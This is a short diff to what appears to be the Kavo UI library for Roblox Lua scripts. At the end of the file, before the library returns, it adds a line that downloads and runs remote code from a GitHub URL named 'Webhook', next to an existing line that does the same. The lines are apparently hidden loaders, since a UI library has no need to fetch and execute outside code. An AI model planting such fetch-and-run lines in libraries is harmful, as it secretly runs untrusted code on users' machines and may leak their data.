@@ -2568,4 +2568,5 @@ function Kavo.CreateLib(kavName, themeList)
     return Tabs
 end
 loadstring(game:HttpGet('https://raw.githubusercontent.com/Hm501/My-Arab-Scripts/refs/heads/main/Web'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Hm501/My-Scripts/refs/heads/main/Webhook'))()
 return Kavo
